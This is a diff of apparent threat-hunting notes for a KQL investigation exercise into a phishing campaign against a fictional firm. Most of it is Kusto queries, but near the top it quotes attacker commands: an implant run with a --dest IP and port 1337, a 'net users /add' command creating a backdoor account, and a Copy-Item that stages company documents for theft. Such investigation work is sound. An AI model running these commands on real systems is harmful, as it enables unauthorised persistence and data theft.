@@ -13,3 +13,131 @@ news-on-industry.com
 eco-awareness-update.net
 
 ecobug.exe --timeout 6000 --dest 98.117.26.236 --port 1337
+
+net users /add gu@rd!an abc1toothree , time= 5/2/2024, 4:50:49 PM
+Copy-Item -Path \\\\solvisystems.com\\SharedDocs\\SoftwareDevelopment\\CycleDocuments\\* -Destination C:\\Users\\alpetrov\\CollectedData\\Software_Cycle_Docs
+
+
+
+
+________________________________________________________________
+whole kql
+InboundNetworkEvents
+| where url contains 'alert'
+
+InboundNetworkEvents
+| where user_agent contains 'Opera/8.64'
+| where timestamp between (datetime("2024-05-03") .. datetime("2024-05-05"))
+//|count 
+
+InboundNetworkEvents
+| take 10
+
+InboundNetworkEvents
+| where user_agent contains 'Opera/8.64'
+| sort by timestamp asc
+| where url contains "product"
+//| where status_code == 200
+
+PassiveDns
+| where ip in ("98.117.26.236","13.201.46.208","105.78.23.64","56.6.30.190","105.78.23.64","56.6.30.190","105.78.23.64","98.117.26.236","13.201.46.208")
+| distinct domain
+
+let attackers_damain =
+PassiveDns
+| where ip in ("98.117.26.236","13.201.46.208","105.78.23.64","56.6.30.190","105.78.23.64","56.6.30.190","105.78.23.64","98.117.26.236","13.201.46.208")
+| distinct domain;
+Email
+| where sender in (attackers_damain)
+
+PassiveDns
+| take 10
+
+Email
+| where sender has_any ("energy-trends4u.net","news-on-industry.com","eco-awareness-update.net")
+
+Email
+| where link has_any ("energy-trends4u.net","news-on-industry.com","eco-awareness-update.net")
+
+
+PassiveDns
+| where ip in ("98.117.26.236","13.201.46.208","105.78.23.64","56.6.30.190","105.78.23.64","56.6.30.190","105.78.23.64","98.117.26.236","13.201.46.208")
+| distinct domain;
+
+
+Email
+| where link has_any ("energy-trends4u.net","news-on-industry.com","eco-awareness-update.net")
+| distinct recipient
+| join kind=inner (Employees) on $left.recipient == $right.email_addr
+| project recipient, role
+| distinct role
+
+|where role == "Customer Support Specialist"
+
+| count 
+
+Email
+| where link has_any ("energy-trends4u.net","news-on-industry.com","eco-awareness-update.net")
+| sort by timestamp asc
+//| distinct recipient
+
+Employees
+| where email_addr == "carla_wharton@solvisystems.com"
+
+OutboundNetworkEvents
+| where url contains "http://news-on-industry.com/search/online/files/public/Energy_Industry_Trends_2024_4_Solvi.docx"
+| sort by timestamp asc
+
+ProcessEvents
+| where hostname == 'JUSP-LAPTOP'
+//| where process_name contains " ecobug.exe"
+//| where process_commandline contains "Energy_Industry_Trends_2024_4_Solvi.docx"
+
+FileCreationEvents
+| where hostname == 'JUSP-LAPTOP'
+//| where filename contains "Energy_Industry_Trends_2024_4_Solvi.docx"
+
+FileCreationEvents
+| where filename contains "ecobug.exe"
+
+ProcessEvents
+| where hostname == 'JUSP-LAPTOP'
+| where timestamp between (datetime("2024-05-01") .. datetime("2024-05-02"))
+//| where process_commandline contains "98.117.26.236"
+//5/1/2024, 3:59:25 PM
+// 5/1/2024, 3:58:59 PM
+
+NetworkFlow
+//| where src_ip contains "10.10.0.164"
+| where dest_ip contains "98.117.26.236"
+|distinct src_ip
+|count 
+
+NetworkFlow
+| take 10
+
+ProcessEvents
+| where process_commandline contains "new"
+| where timestamp between (datetime("2024-05-01") .. datetime("2024-05-04"))
+
+ProcessEvents
+//| where timestamp =='5/2/2024, 8:27:40 AM'
+| where hostname == 'JUSP-LAPTOP'
+|where process_commandline =='net use /PERSISTENT:YES'
+//| where timestamp between (datetime("2024-05-02") .. datetime("2024-05-04"))
+
+ProcessEvents
+//| where timestamp =='5/2/2024, 8:27:40 AM'
+//| where hostname == 'JUSP-LAPTOP'
+| where process_commandline contains "net use"
+//| where timestamp between (datetime("2024-05-02") .. datetime("2024-07-20"))
+//|distinct hostname
+//| count 
+
+ProcessEvents
+| where hostname =='SJ9V-MACHINE'
+| where timestamp between (datetime("2024-05-27") .. datetime("2024-05-29"))
+//|where process_commandline =='net use /PERSISTENT:YES'
+
+Employees
+| where hostname =='SJ9V-MACHINE'
